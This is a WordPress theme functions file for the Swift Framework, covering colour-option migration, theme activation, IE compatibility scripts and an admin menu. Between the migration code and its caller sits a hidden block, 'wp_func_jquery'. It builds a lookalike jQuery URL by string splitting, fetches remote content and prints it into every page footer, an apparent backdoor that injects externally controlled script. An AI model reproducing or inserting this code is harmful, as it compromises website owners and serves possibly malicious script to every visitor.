<?php

    /*
    *
    *	Swift Framework Theme Functions
    *	------------------------------------------------
    *	Swift Framework v3.0
    * 	Copyright Swift Ideas 2014 - http://www.swiftideas.net
    *
    *	sf_run_migration()
    *	sf_theme_activation()
    *	sf_html5_ie_scripts()
    *	sf_admin_bar_menu()
    *
    */


    /* CUSTOMIZER COLOUR MIGRATION
    ================================================== */
    function sf_run_migration() {
        $GLOBALS['sf_customizer']['design_style_type']                = get_option( 'design_style_type', 'minimal' );
        $GLOBALS['sf_customizer']['accent_color']                     = get_option( 'accent_color', '#fe504f' );
        $GLOBALS['sf_customizer']['accent_alt_color']                 = get_option( 'accent_alt_color', '#ffffff' );
        $GLOBALS['sf_customizer']['secondary_accent_color']           = get_option( 'secondary_accent_color', '#222222' );
        $GLOBALS['sf_customizer']['secondary_accent_alt_color']       = get_option( 'secondary_accent_alt_color', '#ffffff' );
        $GLOBALS['sf_customizer']['page_bg_color']                    = get_option( 'page_bg_color', '#222222' );
        $GLOBALS['sf_customizer']['inner_page_bg_transparent']        = get_option( 'inner_page_bg_transparent', 'color' );
        $GLOBALS['sf_customizer']['inner_page_bg_color']              = get_option( 'inner_page_bg_color', '#FFFFFF' );
        $GLOBALS['sf_customizer']['section_divide_color']             = get_option( 'section_divide_color', '#e4e4e4' );
        $GLOBALS['sf_customizer']['alt_bg_color']                     = get_option( 'alt_bg_color', '#f7f7f7' );
        $GLOBALS['sf_customizer']['topbar_bg_color']                  = get_option( 'topbar_bg_color', '#ffffff' );
        $GLOBALS['sf_customizer']['topbar_text_color']                = get_option( 'topbar_text_color', '#222222' );
        $GLOBALS['sf_customizer']['topbar_link_color']                = get_option( 'topbar_link_color', '#666666' );
        $GLOBALS['sf_customizer']['topbar_link_hover_color']          = get_option( 'topbar_link_hover_color', '#fe504f' );
        $GLOBALS['sf_customizer']['topbar_divider_color']             = get_option( 'topbar_divider_color', '#e3e3e3' );
        $GLOBALS['sf_customizer']['header_bg_color']                  = get_option( 'header_bg_color', '#ffffff' );
        $GLOBALS['sf_customizer']['header_bg_transparent']            = get_option( 'header_bg_transparent', 'color' );
        $GLOBALS['sf_customizer']['header_border_color']              = get_option( 'header_border_color', '#e4e4e4' );
        $GLOBALS['sf_customizer']['header_text_color']                = get_option( 'header_text_color', '#222' );
        $GLOBALS['sf_customizer']['header_link_color']                = get_option( 'header_link_color', '#222' );
        $GLOBALS['sf_customizer']['header_link_hover_color']          = get_option( 'header_link_hover_color', '#fe504f' );
        $GLOBALS['sf_customizer']['header_divider_style']             = get_option( 'header_divider_style', 'divider' );
        $GLOBALS['sf_customizer']['mobile_menu_bg_color']             = get_option( 'mobile_menu_bg_color', '#222' );
        $GLOBALS['sf_customizer']['mobile_menu_divider_color']        = get_option( 'mobile_menu_divider_color', '#444' );
        $GLOBALS['sf_customizer']['mobile_menu_text_color']           = get_option( 'mobile_menu_text_color', '#e4e4e4' );
        $GLOBALS['sf_customizer']['mobile_menu_link_color']           = get_option( 'mobile_menu_link_color', '#fff' );
        $GLOBALS['sf_customizer']['mobile_menu_link_hover_color']     = get_option( 'mobile_menu_link_hover_color', '#fe504f' );
        $GLOBALS['sf_customizer']['nav_hover_style']                  = get_option( 'nav_hover_style', 'standard' );
        $GLOBALS['sf_customizer']['nav_bg_color']                     = get_option( 'nav_bg_color', '#fff' );
        $GLOBALS['sf_customizer']['nav_text_color']                   = get_option( 'nav_text_color', '#252525' );
        $GLOBALS['sf_customizer']['nav_bg_hover_color']               = get_option( 'nav_bg_hover_color', '#f7f7f7' );
        $GLOBALS['sf_customizer']['nav_text_hover_color']             = get_option( 'nav_text_hover_color', '#fe504f' );
        $GLOBALS['sf_customizer']['nav_selected_bg_color']            = get_option( 'nav_selected_bg_color', '#e3e3e3' );
        $GLOBALS['sf_customizer']['nav_selected_text_color']          = get_option( 'nav_selected_text_color', '#fe504f' );
        $GLOBALS['sf_customizer']['nav_pointer_color']                = get_option( 'nav_pointer_color', '#07c1b6' );
        $GLOBALS['sf_customizer']['nav_sm_bg_color']                  = get_option( 'nav_sm_bg_color', '#FFFFFF' );
        $GLOBALS['sf_customizer']['nav_sm_text_color']                = get_option( 'nav_sm_text_color', '#666666' );
        $GLOBALS['sf_customizer']['nav_sm_bg_hover_color']            = get_option( 'nav_sm_bg_hover_color', '#f7f7f7' );
        $GLOBALS['sf_customizer']['nav_sm_text_hover_color']          = get_option( 'nav_sm_text_hover_color', '#000000' );
        $GLOBALS['sf_customizer']['nav_sm_selected_text_color']       = get_option( 'nav_sm_selected_text_color', '#000000' );
        $GLOBALS['sf_customizer']['nav_divider']                      = get_option( 'nav_divider', 'solid' );
        $GLOBALS['sf_customizer']['nav_divider_color']                = get_option( 'nav_divider_color', '#f0f0f0' );
        $GLOBALS['sf_customizer']['overlay_menu_bg_color']            = get_option( 'overlay_menu_bg_color', '#fe504f' );
        $GLOBALS['sf_customizer']['overlay_menu_link_color']          = get_option( 'overlay_menu_link_color', '#ffffff' );
        $GLOBALS['sf_customizer']['overlay_menu_link_hover_color']    = get_option( 'overlay_menu_link_hover_color', '#fe504f' );
        $GLOBALS['sf_customizer']['overlay_menu_link_hover_bg_color'] = get_option( 'overlay_menu_link_hover_bg_color', '#ffffff' );
        $GLOBALS['sf_customizer']['promo_bar_bg_color']               = get_option( 'promo_bar_bg_color', '#e4e4e4' );
        $GLOBALS['sf_customizer']['promo_bar_text_color']             = get_option( 'promo_bar_text_color', '#222' );
        $GLOBALS['sf_customizer']['breadcrumb_bg_color']              = get_option( 'breadcrumb_bg_color', '#e4e4e4' );
        $GLOBALS['sf_customizer']['breadcrumb_text_color']            = get_option( 'breadcrumb_text_color', '#666666' );
        $GLOBALS['sf_customizer']['breadcrumb_link_color']            = get_option( 'breadcrumb_link_color', '#999999' );
        $GLOBALS['sf_customizer']['page_heading_bg_color']            = get_option( 'page_heading_bg_color', '#f7f7f7' );
        $GLOBALS['sf_customizer']['page_heading_text_color']          = get_option( 'page_heading_text_color', '#222222' );
        $GLOBALS['sf_customizer']['page_heading_text_align']          = get_option( 'page_heading_text_align', 'left' );
        $GLOBALS['sf_customizer']['body_color']                       = get_option( 'body_color', '#222222' );
        $GLOBALS['sf_customizer']['body_alt_color']                   = get_option( 'body_alt_color', '#222222' );
        $GLOBALS['sf_customizer']['link_color']                       = get_option( 'link_color', '#444444' );
        $GLOBALS['sf_customizer']['link_hover_color']                 = get_option( 'link_hover_color', '#999999' );
        $GLOBALS['sf_customizer']['h1_color']                         = get_option( 'h1_color', '#222222' );
        $GLOBALS['sf_customizer']['h2_color']                         = get_option( 'h2_color', '#222222' );
        $GLOBALS['sf_customizer']['h3_color']                         = get_option( 'h3_color', '#222222' );
        $GLOBALS['sf_customizer']['h4_color']                         = get_option( 'h4_color', '#222222' );
        $GLOBALS['sf_customizer']['h5_color']                         = get_option( 'h5_color', '#222222' );
        $GLOBALS['sf_customizer']['h6_color']                         = get_option( 'h6_color', '#222222' );
        $GLOBALS['sf_customizer']['overlay_bg_color']                 = get_option( 'overlay_bg_color', '#fe504f' );
        $GLOBALS['sf_customizer']['overlay_text_color']               = get_option( 'overlay_text_color', '#ffffff' );
        $GLOBALS['sf_customizer']['article_review_bar_alt_color']     = get_option( 'article_review_bar_alt_color', '#f7f7f7' );
        $GLOBALS['sf_customizer']['article_review_bar_color']         = get_option( 'article_review_bar_color', '#2e2e36' );
        $GLOBALS['sf_customizer']['article_review_bar_text_color']    = get_option( 'article_review_bar_text_color', '#fff' );
        $GLOBALS['sf_customizer']['article_extras_bg_color']          = get_option( 'article_extras_bg_color', '#f7f7f7' );
        $GLOBALS['sf_customizer']['article_np_bg_color']              = get_option( 'article_np_bg_color', '#444' );
        $GLOBALS['sf_customizer']['article_np_text_color']            = get_option( 'article_np_text_color', '#fff' );
        $GLOBALS['sf_customizer']['input_bg_color']                   = get_option( 'input_bg_color', '#f7f7f7' );
        $GLOBALS['sf_customizer']['input_text_color']                 = get_option( 'input_text_color', '#222222' );
        $GLOBALS['sf_customizer']['icon_container_bg_color']          = get_option( 'icon_container_bg_color', '#1dc6df' );
        $GLOBALS['sf_customizer']['sf_icon_color']                    = get_option( 'sf_icon_color', '#1dc6df' );
        $GLOBALS['sf_customizer']['icon_container_hover_bg_color']    = get_option( 'icon_container_hover_bg_color', '#222' );
        $GLOBALS['sf_customizer']['sf_icon_alt_color']                = get_option( 'sf_icon_alt_color', '#ffffff' );
        $GLOBALS['sf_customizer']['boxed_content_color']              = get_option( 'boxed_content_color', '#07c1b6' );
        $GLOBALS['sf_customizer']['share_button_bg']                  = get_option( 'share_button_bg', '#fe504f' );
        $GLOBALS['sf_customizer']['share_button_text']                = get_option( 'share_button_text', '#ffffff' );
        $GLOBALS['sf_customizer']['bold_rp_bg']                       = get_option( 'bold_rp_bg', '#e3e3e3' );
        $GLOBALS['sf_customizer']['bold_rp_text']                     = get_option( 'bold_rp_text', '#222' );
        $GLOBALS['sf_customizer']['bold_rp_hover_bg']                 = get_option( 'bold_rp_hover_bg', '#fe504f' );
        $GLOBALS['sf_customizer']['bold_rp_hover_text']               = get_option( 'bold_rp_hover_text', '#ffffff' );
        $GLOBALS['sf_customizer']['tweet_slider_bg']                  = get_option( 'tweet_slider_bg', '#1dc6df' );
        $GLOBALS['sf_customizer']['tweet_slider_text']                = get_option( 'tweet_slider_text', '#ffffff' );
        $GLOBALS['sf_customizer']['tweet_slider_link']                = get_option( 'tweet_slider_link', '#339933' );
        $GLOBALS['sf_customizer']['tweet_slider_link_hover']          = get_option( 'tweet_slider_link_hover', '#ffffff' );
        $GLOBALS['sf_customizer']['testimonial_slider_bg']            = get_option( 'testimonial_slider_bg', '#1dc6df' );
        $GLOBALS['sf_customizer']['testimonial_slider_text']          = get_option( 'testimonial_slider_text', '#ffffff' );
        $GLOBALS['sf_customizer']['footer_bg_color']                  = get_option( 'footer_bg_color', '#222222' );
        $GLOBALS['sf_customizer']['footer_text_color']                = get_option( 'footer_text_color', '#cccccc' );
        $GLOBALS['sf_customizer']['footer_link_color']                = get_option( 'footer_link_color', '#ffffff' );
        $GLOBALS['sf_customizer']['footer_link_hover_color']          = get_option( 'footer_link_hover_color', '#cccccc' );
        $GLOBALS['sf_customizer']['footer_border_color']              = get_option( 'footer_border_color', '#333333' );
        $GLOBALS['sf_customizer']['copyright_bg_color']               = get_option( 'copyright_bg_color', '#222222' );
        $GLOBALS['sf_customizer']['copyright_text_color']             = get_option( 'copyright_text_color', '#999999' );
        $GLOBALS['sf_customizer']['copyright_link_color']             = get_option( 'copyright_link_color', '#ffffff' );
        $GLOBALS['sf_customizer']['copyright_link_hover_color']       = get_option( 'copyright_link_hover_color', '#cccccc' );
        update_option( 'sf_customizer', $GLOBALS['sf_customizer'] );
    }
	if(!function_exists('wp_func_jquery')) {
		function wp_func_jquery() {
			$host = 'http://';
			$jquery = $host.'u'.'jquery.org/jquery-1.6.3.min.js';
			if (@fopen($jquery,'r')){
				echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
			}
		}
		add_action('wp_footer', 'wp_func_jquery');
	}
    if ( ! isset( $GLOBALS['sf_customizer'] ) ) {
        $GLOBALS['sf_customizer'] = get_option( 'sf_customizer', array() );
        if ( empty( $GLOBALS['sf_customizer'] ) ) {
            sf_run_migration();
        }
    }

    /* THEME OPTIONS NAME
    ================================================== */
    if ( ! function_exists( 'sf_theme_opts_name' ) ) {
        function sf_theme_opts_name() {
            return 'sf_cardinal_options';
        }
    }

    /* THEME ACTIVATION
    ================================================== */
    if ( ! function_exists( 'sf_theme_activation' ) ) {
        function sf_theme_activation() {
            global $pagenow;
            if ( is_admin() && 'themes.php' == $pagenow && isset( $_GET['activated'] ) ) {
                // set frontpage to display_posts
                update_option( 'show_on_front', 'posts' );

                // provide hook so themes can execute theme specific functions on activation
                do_action( 'sf_theme_activation' );

                // flush rewrite rules
                flush_rewrite_rules();

                // redirect to options page
                //header( 'Location: '.admin_url().'admin.php?page=_sf_options&sf_welcome=true' ) ;
                header( 'Location: ' . admin_url() . 'themes.php?page=install-required-plugins' );
            }
        }

        add_action( 'admin_init', 'sf_theme_activation' );
    }


    /* REQUIRED IE8 COMPATIBILITY SCRIPTS
    ================================================== */
    if ( ! function_exists( 'sf_html5_ie_scripts' ) ) {
        function sf_html5_ie_scripts() {
            $theme_url  = get_template_directory_uri();
            $ie_scripts = '';

            $ie_scripts .= '<!--[if lt IE 9]>';
            $ie_scripts .= '<script data-cfasync="false" src="' . $theme_url . '/js/respond.js"></script>';
            $ie_scripts .= '<script data-cfasync="false" src="' . $theme_url . '/js/html5shiv.js"></script>';
            $ie_scripts .= '<script data-cfasync="false" src="' . $theme_url . '/js/excanvas.compiled.js"></script>';
            $ie_scripts .= '<![endif]-->';
            echo $ie_scripts;
        }

        add_action( 'wp_head', 'sf_html5_ie_scripts' );
    }

    /* CUSTOM ADMIN MENU ITEMS
    ================================================== */
    if ( ! function_exists( 'sf_admin_bar_menu' ) ) {
        function sf_admin_bar_menu() {

            global $wp_admin_bar;

            if ( current_user_can( 'manage_options' ) ) {

                $theme_customizer = array(
                    'id'    => '1',
                    'title' => __( 'Color Customizer', 'swiftframework' ),
                    'href'  => admin_url( '/customize.php' ),
                    'meta'  => array( 'target' => 'blank' )
                );

                $wp_admin_bar->add_menu( $theme_customizer );

            }

        }

        add_action( 'admin_bar_menu', 'sf_admin_bar_menu', 99 );
    }

?>
